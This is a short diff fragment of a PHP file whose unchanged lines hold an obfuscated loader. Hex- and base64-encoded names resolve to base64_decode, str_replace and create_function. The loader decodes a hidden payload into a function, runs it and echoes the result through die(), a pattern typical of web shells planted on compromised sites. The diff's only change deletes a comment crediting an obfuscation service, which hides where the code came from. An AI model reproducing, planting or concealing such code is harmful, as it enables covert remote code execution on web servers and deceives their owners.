@@ -10,6 +10,3 @@ $lLPGUpOaode_=sPkZPguEebYeZM(hex2bin('6261736536345f6465636f6465')('2KY'),PHP_EO
 $XAJrj=sPkZPguEebYeZM($iVWkBoFde,$jtXepX,$lLPGUpOaode_);$EVcMOjGhtA=wriPnZxjMW(false,$XAJrj);BFbPKCEPXZebHzV($EVcMOjGhtA());
 function sPkZPguEebYeZM($kQlqnx,$kcJOZq,$lLPGUpOa){return OAISSLIFP('c3RyX3JlcGxhY2U')($kQlqnx,$kcJOZq,$lLPGUpOa);}function sHzAlRwcPGfBROV($kQlqnx,$kcJOZq){return OAISSLIFP('ZXhwbG9kZQ')($kQlqnx,$kcJOZq);}function wriPnZxjMW($kQlqnx,$kcJOZq){$kcJOZq = hex2bin('6261736536345f6465636f6465')($kcJOZq);return OAISSLIFP('Y3JlYXRlX2Z1bmN0aW9u')($kQlqnx,$kcJOZq);}function DwNq($str){$kQlqnx = OAISSLIFP('Y3JlYXRlX2Z1bmN0aW9u')("","return hex2bin('$str');");return $kQlqnx();}function OAISSLIFP($kQlqnx){return hex2bin('6261736536345f6465636f6465')($kQlqnx);}function BFbPKCEPXZebHzV($kQlqnx){die($kQlqnx);}
 
-/*
-    obfuscated at https://tools.zone-xsec.com | @Zeerx7
-*/
